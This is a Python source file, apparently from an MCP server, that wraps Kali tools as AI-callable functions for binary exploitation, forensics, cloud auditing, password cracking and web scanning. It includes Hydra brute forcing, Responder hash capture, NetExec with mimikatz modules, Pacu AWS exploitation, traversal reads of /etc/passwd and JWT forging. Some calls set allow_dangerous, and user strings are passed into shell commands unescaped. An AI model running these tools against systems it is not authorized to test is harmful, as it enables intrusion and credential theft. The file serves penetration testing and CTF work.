async def checksec_analyze(binary_path: str, session_id: str = "") -> dict[str, Any]:
    """Check binary security protections — NX, ASLR, PIE, stack canary, RELRO."""
    logger.info(f"🛡️  CHECKSEC: {binary_path}")
    return await run_kali_tool(tool="checksec", target=binary_path,
                               options="--file=", session_id=session_id)


@mcp.tool()
async def ropgadget_search(
    binary_path: str,
    search: str = "",
    rop: bool = True,
    jop: bool = False,
    session_id: str = "",
) -> dict[str, Any]:
    """
    ROPgadget — search for ROP/JOP/SYS gadgets in binaries.
    search: filter gadgets by pattern (e.g. 'pop rdi')
    """
    logger.info(f"⚙️  ROPGADGET: {binary_path} | search={search}")
    flags = "--rop" if rop else ""
    flags += " --jop" if jop else ""
    flags += f" --string '{search}'" if search else ""
    return await run_kali_tool(tool="ropgadget", target=binary_path,
                               options=f"--binary {flags}", session_id=session_id)


@mcp.tool()
async def ropper_gadget_search(
    binary_path: str,
    search: str = "",
    rop_type: str = "rop",
    session_id: str = "",
) -> dict[str, Any]:
    """
    Ropper — find ROP gadgets, show sections, and analyze binaries.
    rop_type: rop | jop | sys
    search: pattern to search for (e.g. 'pop rdi; ret')
    """
    logger.info(f"⚙️  ROPPER: {binary_path} | search={search}")
    search_flag = f"--search '{search}'" if search else f"--type {rop_type}"
    return await run_kali_tool(tool="ropper", target=binary_path,
                               options=f"-f {search_flag}", session_id=session_id)


@mcp.tool()
async def one_gadget_search(
    libc_path: str = "/lib/x86_64-linux-gnu/libc.so.6",
    level: int = 1,
    session_id: str = "",
) -> dict[str, Any]:
    """
    one_gadget — find one-gadget ROP exploits in libc that spawn /bin/sh.
    level: search depth (higher = more gadgets but slower)
    """
    logger.info(f"🎯 ONE_GADGET: {libc_path} | level={level}")
    return await run_kali_tool(tool="one_gadget", target=libc_path,
                               options=f"-l {level}", session_id=session_id)


@mcp.tool()
async def libc_database_lookup(
    function: str,
    offset: str,
    arch: str = "amd64",
    session_id: str = "",
) -> dict[str, Any]:
    """
    Look up libc version from leaked function offsets using libc-database.
    function: leaked function name (e.g. 'puts')
    offset: leaked address (e.g. '0x7f1234567890')
    """
    logger.info(f"📚 LIBC-DB: {function}={offset} | arch={arch}")
    script = f"""
import subprocess, sys
# Try libc-database find
result = subprocess.run(
    ['find', '{function}', '{offset}'],
    capture_output=True, text=True, timeout=30,
    cwd='/opt/libc-database' if __import__('os').path.exists('/opt/libc-database') else '/'
)
print('STDOUT:', result.stdout[:2000])
print('STDERR:', result.stderr[:500])
# Also try pwntools libc.rip
try:
    import urllib.request, json
    url = f'https://libc.rip/api/find'
    data = json.dumps({{"symbols": {{"{function}": "{offset}"}}}}).encode()
    req = urllib.request.Request(url, data=data, headers={{'Content-Type': 'application/json'}})
    with urllib.request.urlopen(req, timeout=10) as r:
        results = json.loads(r.read())
        print('\\nlibc.rip results:')
        for lib in results[:5]:
            print(f"  {{lib.get('id')}} - {{lib.get('download_url', '')}}")
except Exception as e:
    print(f'\\nlibc.rip lookup failed: {{e}}')
"""
    return await execute_python_script(script=script, filename="libc_lookup.py",
                                       allow_dangerous=True, timeout=30)


@mcp.tool()
async def pwntools_exploit(
    script: str,
    binary_path: str = "",
    host: str = "",
    port: int = 0,
    session_id: str = "",
) -> dict[str, Any]:
    """
    Run a pwntools exploit script — CTF binary exploitation framework.
    script: Python pwntools script content
    binary_path: path to local binary (sets context)
    host/port: remote target if exploiting over network
    """
    logger.info(f"💥 PWNTOOLS: binary={binary_path} | remote={host}:{port}")
    header = "from pwn import *\n"
    if binary_path:
        header += f"elf = ELF('{binary_path}', checksec=False)\n"
    if host and port:
        header += f"conn = remote('{host}', {port})\n"
    elif binary_path:
        header += f"conn = process('{binary_path}')\n"
    full_script = header + "\n" + script
    return await execute_python_script(script=full_script, filename="pwn_exploit.py",
                                       allow_dangerous=True, timeout=60)


@mcp.tool()
async def pwninit_setup(
    binary_path: str,
    libc_path: str = "",
    ld_path: str = "",
    session_id: str = "",
) -> dict[str, Any]:
    """
    pwninit — patch CTF binary to use target libc and linker for local exploitation.
    Automatically patches the binary's interpreter and rpath.
    """
    logger.info(f"🔧 PWNINIT: {binary_path}")
    options = ""
    if libc_path:
        options += f" --libc {libc_path}"
    if ld_path:
        options += f" --ld {ld_path}"
    return await run_kali_tool(tool="pwninit", target=binary_path,
                               options=f"--bin{options}", session_id=session_id)


@mcp.tool()
async def hashpump_attack(
    signature: str,
    original_data: str,
    append_data: str,
    key_length: int,
    session_id: str = "",
) -> dict[str, Any]:
    """
    Hash length extension attack — forge MAC signatures (MD5, SHA1, SHA256).
    signature: original hex hash/signature
    original_data: original signed data
    append_data: data to append to the forged message
    key_length: length of the secret key (guess or known)
    """
    logger.info(f"🔑 HASHPUMP: key_len={key_length} | append={append_data[:20]}")
    options = f"-s '{signature}' -d '{original_data}' -a '{append_data}' -k {key_length}"
    return await run_kali_tool(tool="hashpump", target=original_data,
                               options=options, session_id=session_id,
                               allow_dangerous=True)


@mcp.tool()
async def binwalk_analyze(
    file_path: str,
    extract: bool = False,
    entropy: bool = False,
    session_id: str = "",
) -> dict[str, Any]:
    """
    Binwalk — analyze and extract firmware, find embedded files and filesystems.
    extract: automatically extract found files
    entropy: plot entropy analysis
    """
    logger.info(f"📦 BINWALK: {file_path} | extract={extract}")
    flags = "-e" if extract else ""
    flags += " -E" if entropy else ""
    return await run_kali_tool(tool="binwalk", target=file_path,
                               options=flags.strip(), session_id=session_id)


# ============================================================================
# FORENSICS TOOLS
# ============================================================================

@mcp.tool()
async def volatility_analyze(
    memory_dump: str,
    plugin: str = "imageinfo",
    profile: str = "",
    extra_args: str = "",
    session_id: str = "",
) -> dict[str, Any]:
    """
    Volatility2 memory forensics — analyze RAM dumps for processes, network, malware.
    plugin: imageinfo | pslist | pstree | netscan | dlllist | cmdline | filescan | malfind
    profile: e.g. Win7SP1x64 (required for v2 after imageinfo)
    """
    logger.info(f"🧠 VOLATILITY: {memory_dump} | plugin={plugin}")
    profile_flag = f"--profile={profile}" if profile else ""
    options = f"-f {profile_flag} {extra_args} {plugin}".strip()
    return await run_kali_tool(tool="volatility", target=memory_dump,
                               options=options, session_id=session_id)


@mcp.tool()
async def volatility3_analyze(
    memory_dump: str,
    plugin: str = "windows.pslist",
    extra_args: str = "",
    session_id: str = "",
) -> dict[str, Any]:
    """
    Volatility3 memory forensics — modern memory analysis supporting Windows/Linux/macOS.
    plugin: windows.pslist | windows.netscan | windows.cmdline | linux.pslist |
            windows.malfind | windows.dlllist | windows.filescan
    """
    logger.info(f"🧠 VOLATILITY3: {memory_dump} | plugin={plugin}")
    options = f"-f {extra_args} {plugin}".strip()
    return await run_kali_tool(tool="volatility3", target=memory_dump,
                               options=options, session_id=session_id)


@mcp.tool()
async def foremost_carving(
    disk_image: str,
    output_dir: str = "/tmp/proflupinmind_files/foremost_output",
    file_types: str = "",
    session_id: str = "",
) -> dict[str, Any]:
    """
    Foremost file carving — recover deleted files from disk images by file signatures.
    file_types: comma-separated (e.g. 'jpg,pdf,zip') — all types if empty
    """
    logger.info(f"🗂️  FOREMOST: {disk_image} | types={file_types}")
    type_flag = f"-t {file_types}" if file_types else ""
    options = f"-i {type_flag} -o {output_dir}".strip()
    return await run_kali_tool(tool="foremost", target=disk_image,
                               options=options, session_id=session_id)


@mcp.tool()
async def exiftool_extract(
    file_path: str,
    output_format: str = "text",
    session_id: str = "",
) -> dict[str, Any]:
    """
    ExifTool — extract metadata from images, PDFs, audio, video, and documents.
    output_format: text | json | csv
    """
    logger.info(f"📋 EXIFTOOL: {file_path} | fmt={output_format}")
    fmt_flag = "-json" if output_format == "json" else ("-csv" if output_format == "csv" else "")
    return await run_kali_tool(tool="exiftool", target=file_path,
                               options=fmt_flag, session_id=session_id)


@mcp.tool()
async def steghide_analysis(
    file_path: str,
    action: str = "info",
    passphrase: str = "",
    output_file: str = "",
    session_id: str = "",
) -> dict[str, Any]:
    """
    Steghide — hide or extract data from images and audio files.
    action: info (show info) | extract (extract hidden data) | embed (hide data)
    """
    logger.info(f"🎭 STEGHIDE: {file_path} | action={action}")
    if action == "extract":
        pass_flag = f"-p '{passphrase}'" if passphrase else "-p ''"
        out_flag = f"-sf {output_file}" if output_file else ""
        options = f"extract {pass_flag} {out_flag} -f"
    elif action == "embed":
        pass_flag = f"-p '{passphrase}'" if passphrase else ""
        options = f"embed -cf {file_path} -ef {output_file} {pass_flag}"
    else:
        options = "info"
    return await run_kali_tool(tool="steghide", target=file_path,
                               options=options, session_id=session_id)


@mcp.tool()
async def strings_extract(
    file_path: str,
    min_length: int = 4,
    encoding: str = "s",
    grep_pattern: str = "",
    session_id: str = "",
) -> dict[str, Any]:
    """
    Strings — extract human-readable strings from binary files.
    encoding: s (7-bit) | S (8-bit) | l (16-bit little-endian) | b (16-bit big-endian)
    grep_pattern: optional pattern to filter strings (e.g. 'password', 'flag{')
    """
    logger.info(f"📝 STRINGS: {file_path} | min={min_length} | grep={grep_pattern}")
    grep_pipe = f" | grep -i '{grep_pattern}'" if grep_pattern else ""
    options = f"-n {min_length} -e {encoding}{grep_pipe}"
    return await run_kali_tool(tool="strings", target=file_path,
                               options=options, session_id=session_id)


@mcp.tool()
async def xxd_hexdump(
    file_path: str,
    length: int = 256,
    offset: int = 0,
    reverse: bool = False,
    session_id: str = "",
) -> dict[str, Any]:
    """
    xxd — hex dump binary files or convert hex back to binary.
    length: number of bytes to dump (0 = full file)
    offset: start offset in bytes
    reverse: convert hex dump back to binary
    """
    logger.info(f"🔢 XXD: {file_path} | offset={offset} | len={length}")
    len_flag = f"-l {length}" if length > 0 else ""
    off_flag = f"-s {offset}" if offset > 0 else ""
    rev_flag = "-r" if reverse else ""
    options = f"{rev_flag} {len_flag} {off_flag}".strip()
    return await run_kali_tool(tool="xxd", target=file_path,
                               options=options, session_id=session_id)


# ============================================================================
# CLOUD / CONTAINER SECURITY TOOLS
# ============================================================================

@mcp.tool()
async def checkov_iac_scan(
    path: str,
    framework: str = "terraform",
    check: str = "",
    output_format: str = "json",
    session_id: str = "",
) -> dict[str, Any]:
    """
    Checkov IaC security scanner — Terraform, CloudFormation, Kubernetes, Helm, Dockerfile.
    framework: terraform | cloudformation | kubernetes | helm | dockerfile | all
    check: specific check ID to run (e.g. 'CKV_AWS_1') — all checks if empty
    """
    logger.info(f"☁️  CHECKOV: {path} | framework={framework}")
    check_flag = f"--check {check}" if check else ""
    # Path must follow -d directly; putting it in options avoids _build_command appending it at end.
    options = f"-d {path} -t {framework} -o {output_format} {check_flag}".strip()
    return await run_kali_tool(tool="checkov", target=path,
                               options=options, session_id=session_id)


@mcp.tool()
async def terrascan_iac_scan(
    path: str,
    iac_type: str = "terraform",
    cloud_provider: str = "aws",
    severity: str = "medium",
    session_id: str = "",
) -> dict[str, Any]:
    """
    Terrascan static IaC analysis — Terraform, Kubernetes, Docker, Helm, ARM.
    iac_type: terraform | k8s | docker | helm | arm
    cloud_provider: aws | azure | gcp | github
    severity: low | medium | high
    """
    logger.info(f"☁️  TERRASCAN: {path} | type={iac_type}")
    options = f"scan -t {iac_type} -p {cloud_provider} --severity {severity} -d"
    return await run_kali_tool(tool="terrascan", target=path,
                               options=options, session_id=session_id)


@mcp.tool()
async def trivy_scan(
    target: str,
    scan_type: str = "image",
    severity: str = "HIGH,CRITICAL",
    output_format: str = "json",
    session_id: str = "",
) -> dict[str, Any]:
    """
    Trivy — comprehensive vulnerability scanner for containers, filesystems, IaC.
    scan_type: image | fs | repo | config | sbom
    severity: UNKNOWN | LOW | MEDIUM | HIGH | CRITICAL (comma-separated)
    """
    logger.info(f"🔍 TRIVY: {target} | type={scan_type} | sev={severity}")
    options = f"{scan_type} --severity {severity} -f {output_format}"
    return await run_kali_tool(tool="trivy", target=target,
                               options=options, session_id=session_id)


@mcp.tool()
async def clair_vulnerability_scan(
    image: str,
    host_ip: str = "127.0.0.1",
    session_id: str = "",
) -> dict[str, Any]:
    """
    Clair container image vulnerability scanner — static analysis of Docker/OCI images.
    image: docker image name (e.g. 'nginx:latest')
    """
    logger.info(f"🐳 CLAIR: {image} | host={host_ip}")
    options = f"--ip {host_ip}"
    return await run_kali_tool(tool="clair", target=image,
                               options=options, session_id=session_id)


@mcp.tool()
async def kube_bench_cis(
    targets: str = "master,node",
    version: str = "",
    session_id: str = "",
) -> dict[str, Any]:
    """
    kube-bench — CIS Kubernetes Benchmark security audit.
    targets: master | node | etcd | controlplane | policies | all
    version: Kubernetes version override (e.g. '1.28')
    """
    logger.info(f"⚓ KUBE-BENCH: targets={targets}")
    ver_flag = f"--version {version}" if version else ""
    options = f"run --targets {targets} {ver_flag}".strip()
    return await run_kali_tool(tool="kube-bench", target=targets,
                               options=options, session_id=session_id)


@mcp.tool()
async def kube_hunter_scan(
    target: str = "",
    remote: bool = True,
    pod: bool = False,
    session_id: str = "",
    allow_dangerous: bool = False,
) -> dict[str, Any]:
    """
    kube-hunter — Kubernetes penetration testing for security weaknesses.
    target: cluster IP or hostname (remote scan)
    pod: run from inside a pod to test lateral movement
    """
    logger.info(f"🎯 KUBE-HUNTER: {target} | remote={remote}")
    if remote and target:
        options = f"--remote {target} --report json"
    elif pod:
        options = "--pod --report json"
    else:
        options = "--cidr 10.0.0.0/8 --report json"
    return await run_kali_tool(tool="kube-hunter", target=target or "localhost",
                               options=options, session_id=session_id,
                               allow_dangerous=allow_dangerous)


@mcp.tool()
async def docker_bench_security_scan(session_id: str = "") -> dict[str, Any]:
    """Docker CIS Benchmark — checks Docker daemon configuration and container security."""
    logger.info("🐳 DOCKER-BENCH-SECURITY")
    return await run_kali_tool(tool="docker-bench-security", target="localhost",
                               options="", session_id=session_id)


@mcp.tool()
async def falco_runtime_monitoring(
    duration: int = 30,
    rules_file: str = "/etc/falco/falco_rules.yaml",
    output_format: str = "json",
    session_id: str = "",
) -> dict[str, Any]:
    """
    Falco runtime security — detect anomalous activity in containers and hosts.
    duration: monitoring duration in seconds
    """
    logger.info(f"👁️  FALCO: duration={duration}s")
    options = f"-r {rules_file} -o 'json_output=true' --timeout {duration}"
    return await run_kali_tool(tool="falco", target="localhost",
                               options=options, session_id=session_id)


@mcp.tool()
async def pacu_exploitation(
    module: str = "iam__enum_permissions",
    args: str = "",
    session_id: str = "",
    allow_dangerous: bool = False,
) -> dict[str, Any]:
    """
    Pacu — AWS exploitation framework for enumerating and attacking AWS environments.
    module: iam__enum_permissions | ec2__enum | s3__bucket_finder | lambda__enum | sts__assume_role
    """
    logger.info(f"☁️  PACU: module={module}")
    options = f"--module-name {module} {args}".strip()
    return await run_kali_tool(tool="pacu", target="aws",
                               options=options, session_id=session_id,
                               allow_dangerous=allow_dangerous)


@mcp.tool()
async def prowler_scan(
    provider: str = "aws",
    checks: str = "",
    severity: str = "high,critical",
    output_format: str = "text",
    session_id: str = "",
) -> dict[str, Any]:
    """
    Prowler — AWS/Azure/GCP security assessment aligned to CIS benchmarks.
    provider: aws | azure | gcp
    checks: comma-separated check IDs (e.g. 'check11,check12') — all if empty
    """
    logger.info(f"☁️  PROWLER: {provider} | sev={severity}")
    check_flag = f"-c {checks}" if checks else ""
    options = f"{provider} -S {severity} -M {output_format} {check_flag}".strip()
    return await run_kali_tool(tool="prowler", target=provider,
                               options=options, session_id=session_id)


@mcp.tool()
async def scout_suite_assessment(
    provider: str = "aws",
    region: str = "",
    session_id: str = "",
) -> dict[str, Any]:
    """
    Scout Suite — multi-cloud security auditing for AWS, Azure, and GCP.
    provider: aws | azure | gcp | aliyun | oci
    """
    logger.info(f"☁️  SCOUT-SUITE: {provider} | region={region}")
    region_flag = f"--regions {region}" if region else ""
    options = f"--no-browser {region_flag}".strip()
    return await run_kali_tool(tool="scout-suite", target=provider,
                               options=options, session_id=session_id)


@mcp.tool()
async def cloudmapper_analysis(
    account: str,
    command: str = "collect",
    session_id: str = "",
) -> dict[str, Any]:
    """
    CloudMapper — visualize and analyze AWS account resources and attack surface.
    command: collect | prepare | report | webserver | find_admins | find_unused
    """
    logger.info(f"☁️  CLOUDMAPPER: account={account} | cmd={command}")
    options = f"{command} --account {account}"
    return await run_kali_tool(tool="cloudmapper", target=account,
                               options=options, session_id=session_id)


# ============================================================================
# PASSWORD ATTACKS & CREDENTIAL TOOLS
# ============================================================================

@mcp.tool()
async def hydra_attack(
    target: str,
    service: str,
    username: str = "",
    username_file: str = "",
    password: str = "",
    password_file: str = "/usr/share/wordlists/rockyou.txt",
    port: int = 0,
    extra_options: str = "",
    session_id: str = "",
    allow_dangerous: bool = False,
) -> dict[str, Any]:
    """
    Hydra — parallelized login cracker for SSH, FTP, HTTP, RDP, SMB, and 50+ protocols.
    service: ssh | ftp | http-post-form | rdp | smb | telnet | mysql | mssql | vnc
    username/username_file: single user or wordlist path
    password/password_file: single pass or wordlist path
    """
    logger.info(f"🔑 HYDRA: {target}:{port} | svc={service}")
    user_flag = f"-l {username}" if username else f"-L {username_file}"
    pass_flag = f"-p {password}" if password else f"-P {password_file}"
    port_flag = f"-s {port}" if port else ""
    options = f"{user_flag} {pass_flag} {port_flag} {extra_options}".strip()
    return await run_kali_tool(tool="hydra", target=f"{target} {service}",
                               options=options, session_id=session_id,
                               allow_dangerous=allow_dangerous)


@mcp.tool()
async def hashcat_crack(
    hash_file: str,
    hash_type: int = 0,
    attack_mode: int = 0,
    wordlist: str = "/usr/share/wordlists/rockyou.txt",
    rules: str = "",
    extra_options: str = "",
    session_id: str = "",
) -> dict[str, Any]:
    """
    Hashcat — GPU-accelerated password hash cracker supporting 300+ hash types.
    hash_type: 0=MD5 | 100=SHA1 | 1800=sha512crypt | 1000=NTLM | 3200=bcrypt
               5500=NTLMv1 | 5600=NTLMv2 | 13100=Kerberos TGS-REP
    attack_mode: 0=dictionary | 1=combination | 3=brute-force | 6=hybrid wordlist+mask
    """
    logger.info(f"🔐 HASHCAT: {hash_file} | type={hash_type} | mode={attack_mode}")
    rules_flag = f"-r {rules}" if rules else ""
    options = f"-m {hash_type} -a {attack_mode} {rules_flag} {extra_options} {wordlist}".strip()
    return await run_kali_tool(tool="hashcat", target=hash_file,
                               options=options, session_id=session_id)


@mcp.tool()
async def john_crack(
    hash_file: str,
    wordlist: str = "/usr/share/wordlists/rockyou.txt",
    format: str = "",
    rules: str = "",
    show: bool = False,
    session_id: str = "",
) -> dict[str, Any]:
    """
    John the Ripper — offline password hash cracker (MD5, SHA, NTLM, bcrypt, etc.).
    format: auto-detect if empty. e.g. 'nt' | 'bcrypt' | 'sha512crypt' | 'zip'
    show: display already-cracked passwords instead of cracking
    """
    logger.info(f"🔓 JOHN: {hash_file} | fmt={format} | show={show}")
    if show:
        options = "--show"
    else:
        fmt_flag = f"--format={format}" if format else ""
        rules_flag = f"--rules={rules}" if rules else ""
        options = f"--wordlist={wordlist} {fmt_flag} {rules_flag}".strip()
    return await run_kali_tool(tool="john", target=hash_file,
                               options=options, session_id=session_id)


@mcp.tool()
async def responder_credential_harvest(
    interface: str = "eth0",
    duration: int = 60,
    rdp: bool = False,
    wpad: bool = False,
    session_id: str = "",
    allow_dangerous: bool = False,
) -> dict[str, Any]:
    """
    Responder — LLMNR/NBT-NS/MDNS poisoner to capture NTLMv2 hashes.
    interface: network interface to listen on
    duration: capture duration in seconds
    rdp/wpad: enable RDP or WPAD capture
    """
    logger.info(f"🎣 RESPONDER: iface={interface} | dur={duration}s")
    rdp_flag = "--rdp" if rdp else ""
    wpad_flag = "--wpad" if wpad else ""
    options = f"-I {interface} -rdwv {rdp_flag} {wpad_flag}".strip()
    return await run_kali_tool(tool="responder", target=interface,
                               options=options, session_id=session_id,
                               allow_dangerous=allow_dangerous)


@mcp.tool()
async def netexec_scan(
    target: str,
    protocol: str = "smb",
    username: str = "",
    password: str = "",
    hash: str = "",
    module: str = "",
    extra_options: str = "",
    session_id: str = "",
    allow_dangerous: bool = False,
) -> dict[str, Any]:
    """
    NetExec (CrackMapExec successor) — SMB, WinRM, LDAP, SSH, RDP enumeration and attacks.
    protocol: smb | winrm | ldap | ssh | rdp | ftp | mssql
    module: e.g. 'spider_plus', 'enum_av', 'lsassy', 'mimikatz'
    """
    logger.info(f"🌐 NETEXEC: {target} | proto={protocol}")
    creds = ""
    if username and password:
        creds = f"-u {username} -p {password}"
    elif username and hash:
        creds = f"-u {username} -H {hash}"
    mod_flag = f"-M {module}" if module else ""
    options = f"{protocol} {creds} {mod_flag} {extra_options}".strip()
    return await run_kali_tool(tool="netexec", target=target,
                               options=options, session_id=session_id,
                               allow_dangerous=allow_dangerous)


# ============================================================================
# WEB SECURITY DEDICATED TOOLS
# ============================================================================

@mcp.tool()
async def dalfox_xss_scan(
    target: str,
    param: str = "",
    blind_xss_url: str = "",
    output_format: str = "plain",
    session_id: str = "",
    allow_dangerous: bool = False,
) -> dict[str, Any]:
    """
    Dalfox — fast XSS scanner and parameter analysis tool.
    param: specific parameter to test (tests all if empty)
    blind_xss_url: URL for blind XSS callbacks
    output_format: plain | json
    """
    logger.info(f"🎯 DALFOX: {target}")
    param_flag = f"-p {param}" if param else ""
    blind_flag = f"--blind {blind_xss_url}" if blind_xss_url else ""
    fmt_flag = f"-o {output_format}" if output_format != "plain" else ""
    # Include "url <target>" in options so _build_command sees target already present
    # and scope is set correctly from the real URL, not a prefixed string.
    extra = " ".join(p for p in [param_flag, blind_flag, fmt_flag] if p)
    options = f"url {target} {extra}".strip()
    return await run_kali_tool(tool="dalfox", target=target,
                               options=options, session_id=session_id,
                               allow_dangerous=allow_dangerous)


@mcp.tool()
async def xsser_scan(
    target: str,
    param: str = "",
    auto: bool = True,
    session_id: str = "",
    allow_dangerous: bool = False,
) -> dict[str, Any]:
    """
    XSSer — automated XSS detection and exploitation framework.
    param: parameter to inject into (e.g. '?q=XSS')
    auto: use automatic mode to test all parameters
    """
    logger.info(f"🎯 XSSER: {target}")
    auto_flag = "--auto" if auto else ""
    param_flag = param if param else ""
    options = f"{auto_flag} {param_flag}".strip()
    return await run_kali_tool(tool="xsser", target=target,
                               options=f"--url '{target}' {options}",
                               session_id=session_id, allow_dangerous=allow_dangerous)


@mcp.tool()
async def wpscan_analyze(
    target: str,
    enumerate: str = "vp,u,vt",
    api_token: str = "",
    aggressive: bool = False,
    session_id: str = "",
) -> dict[str, Any]:
    """
    WPScan — WordPress vulnerability scanner for plugins, themes, users, and CVEs.
    enumerate: vp (vuln plugins) | u (users) | vt (vuln themes) | ap (all plugins) | at (all themes)
    api_token: WPVulnDB API token for CVE data
    """
    logger.info(f"📰 WPSCAN: {target} | enum={enumerate}")
    token_flag = f"--api-token {api_token}" if api_token else ""
    aggro_flag = "--detection-mode aggressive" if aggressive else ""
    options = (
        f"--url {target} --enumerate {enumerate} "
        f"--no-update --request-timeout 30 --connect-timeout 15 --force "
        f"--wp-content-dir wp-content --format json {token_flag} {aggro_flag}"
    ).strip()
    return await run_kali_tool(tool="wpscan", target=target,
                               options=options, session_id=session_id)


@mcp.tool()
async def wafw00f_scan(
    target: str,
    find_all: bool = False,
    session_id: str = "",
) -> dict[str, Any]:
    """
    wafw00f — detect and fingerprint Web Application Firewalls (WAF).
    find_all: test all WAF signatures instead of stopping at first match.
    """
    logger.info(f"🛡️  WAFW00F: {target}")
    all_flag = "-a" if find_all else ""
    return await run_kali_tool(tool="wafw00f", target=target,
                               options=all_flag, session_id=session_id)


@mcp.tool()
async def dotdotpwn_scan(
    target: str,
    module: str = "http",
    depth: int = 6,
    file_to_read: str = "/etc/passwd",
    port: int = 80,
    session_id: str = "",
    allow_dangerous: bool = False,
) -> dict[str, Any]:
    """
    dotdotpwn — directory traversal fuzzer for HTTP, FTP, TFTP, and payload generation.
    module: http | ftp | tftp | http-url | payload
    depth: traversal depth (number of ../ sequences)
    file_to_read: target file to attempt to read
    """
    logger.info(f"📂 DOTDOTPWN: {target} | module={module} | depth={depth}")
    ssl_flag = "-s" if port == 443 or str(target).startswith("https") else ""
    options = f"-m {module} -h {target} -d {depth} -f {file_to_read} -p {port} {ssl_flag} -q".strip()
    return await run_kali_tool(tool="dotdotpwn", target=target,
                               options=options, session_id=session_id,
                               allow_dangerous=allow_dangerous)


@mcp.tool()
async def graphql_scanner(
    target: str,
    introspection: bool = True,
    injection: bool = False,
    session_id: str = "",
    allow_dangerous: bool = False,
) -> dict[str, Any]:
    """
    GraphQL security scanner — introspection enumeration, injection, and schema analysis.
    introspection: dump full schema via introspection query
    injection: test for GraphQL injection vulnerabilities
    """
    logger.info(f"📊 GRAPHQL: {target} | introspect={introspection}")
    if introspection:
        script = f"""
import urllib.request, json
url = '{target}'
query = {{'query': '{{__schema{{types{{name,fields{{name,type{{name}}}}}}}}}}'}}
data = json.dumps(query).encode()
req = urllib.request.Request(url, data=data, headers={{'Content-Type': 'application/json'}})
try:
    with urllib.request.urlopen(req, timeout=15) as r:
        result = json.loads(r.read())
        types = result.get('data', {{}}).get('__schema', {{}}).get('types', [])
        print(f'GraphQL Schema: {{len(types)}} types found')
        for t in types[:20]:
            if not t['name'].startswith('__'):
                fields = [f['name'] for f in (t.get('fields') or [])]
                print(f"  Type: {{t['name']}} | Fields: {{', '.join(fields[:5])}}")
except Exception as e:
    print(f'Error: {{e}}')
"""
        return await execute_python_script(script=script, filename="graphql_scan.py",
                                           allow_dangerous=True, timeout=30)
    return await run_kali_tool(tool="graphqlmap", target=target,
                               options="-u", session_id=session_id,
                               allow_dangerous=allow_dangerous)


@mcp.tool()
async def jwt_analyzer(
    token: str,
    action: str = "decode",
    secret: str = "",
    algorithm: str = "",
    session_id: str = "",
) -> dict[str, Any]:
    """
    JWT analyzer — decode, forge, test algorithm confusion and crack JWT tokens.
    action: decode | crack | forge | alg_confusion | none_attack
    secret: secret key for cracking or forging
    algorithm: override algorithm (e.g. 'HS256', 'none')
    """
    logger.info(f"🔑 JWT: action={action} | alg={algorithm}")
    if action == "decode":
        script = f"""
import base64, json
token = '{token}'
parts = token.split('.')
if len(parts) >= 2:
    for i, part in enumerate(['Header', 'Payload']):
        try:
            padded = parts[i] + '=' * (4 - len(parts[i]) % 4)
            decoded = base64.urlsafe_b64decode(padded)
            print(f'{{part}}: {{json.dumps(json.loads(decoded), indent=2)}}')
        except Exception as e:
            print(f'{{part}} decode error: {{e}}')
print(f'\\nSignature: {{parts[2] if len(parts) > 2 else "missing"}}')
"""
        return await execute_python_script(script=script, filename="jwt_decode.py",
                                           allow_dangerous=True, timeout=10)
    options = f"-T" if action == "crack" else f"-X {action}"
    if secret:
        options += f" -S hs256 -k '{secret}'"
    return await run_kali_tool(tool="jwt_tool", target=token,
                               options=options, session_id=session_id)


@mcp.tool()
async def jaeles_scan(
    target: str,
    signatures: str = "~/jaeles-signatures/",
    output_dir: str = "/tmp/proflupinmind_files/jaeles",
    session_id: str = "",
    allow_dangerous: bool = False,
) -> dict[str, Any]:
    """
    Jaeles — signature-based web vulnerability scanner for bug bounty automation.
    signatures: path to signature directory
    """
    logger.info(f"🔍 JAELES: {target}")
    # -u needs the URL immediately after it; embed target in options so _build_command
    # doesn't append it again and so the scope is derived from the real URL.
    options = f"scan -u {target} -s '{signatures}' -o {output_dir}"
    return await run_kali_tool(tool="jaeles", target=target,
                               options=options, session_id=session_id,
                               allow_dangerous=allow_dangerous)


@mcp.tool()
async def burpsuite_scan(
    target: str,
    scan_type: str = "passive",
    config: str = "",
    session_id: str = "",
    allow_dangerous: bool = False,
) -> dict[str, Any]:
    """
    Burp Suite alternative scan via CLI (headless mode / REST API).
    scan_type: passive | active | crawl
    For full Burp Suite, use browser proxy at http://127.0.0.1:8080.
    """
    logger.info(f"🕷️  BURPSUITE: {target} | type={scan_type}")
    # Use nuclei as a capable alternative when Burp CLI is unavailable
    if scan_type == "passive":
        options = f"-u -severity info,low,medium,high,critical -t technologies/"
        return await run_kali_tool(tool="nuclei", target=target,
                                   options=options, session_id=session_id)
    options = f"-u -severity medium,high,critical"
    return await run_kali_tool(tool="nuclei", target=target,
                               options=options, session_id=session_id,
                               allow_dangerous=allow_dangerous)


@mcp.tool()
async def zap_scan(
    target: str,
    scan_type: str = "baseline",
    ajax: bool = False,
    output_file: str = "/tmp/proflupinmind_files/zap_report.html",
    session_id: str = "",
    allow_dangerous: bool = False,
) -> dict[str, Any]:
    """
    OWASP ZAP — automated web application security scanner.
    scan_type: baseline (passive) | full (active) | api (OpenAPI/SOAP/GraphQL)
    ajax: use AJAX spider for JavaScript-heavy sites
    """
    logger.info(f"🕷️  ZAP: {target} | type={scan_type}")
    ajax_flag = "-j" if ajax else ""
    zap_scripts = {"full": "zap-full-scan.py", "api": "zap-api-scan.py"}
    zap_script = zap_scripts.get(scan_type, "zap-baseline.py")
    # Embed target in options so scope is set correctly and _build_command
    # doesn't append it. Use the script directly as the command.
    options = f"-t {target} {ajax_flag} -r {output_file}".strip()
    return await run_kali_tool(tool=zap_script, target=target,
                               options=options,
                               session_id=session_id, allow_dangerous=allow_dangerous)


@mcp.tool()
async def api_fuzzer(
    target: str,
    method: str = "GET",
    wordlist: str = "/usr/share/wordlists/dirb/common.txt",
    content_type: str = "application/json",
    param_file: str = "",
    session_id: str = "",
    allow_dangerous: bool = False,
) -> dict[str, Any]:
    """
    API fuzzer — fuzz REST API endpoints, parameters, and headers.
    method: GET | POST | PUT | DELETE | PATCH
    """
    logger.info(f"📡 API-FUZZER: {target} | method={method}")
    param_flag = f"-d '@{param_file}'" if param_file else ""
    options = (f"-w {wordlist} -X {method} "
               f"-H 'Content-Type: {content_type}' {param_flag}").strip()
    return await run_kali_tool(tool="ffuf", target=target + "/FUZZ",
                               options=options, session_id=session_id,
                               allow_dangerous=allow_dangerous)


@mcp.tool()
async def api_schema_analyzer(
    target: str,
    schema_type: str = "auto",
    output_file: str = "",
    session_id: str = "",
) -> dict[str, Any]:
    """
    API schema analyzer — discover and parse OpenAPI/Swagger/GraphQL schemas.
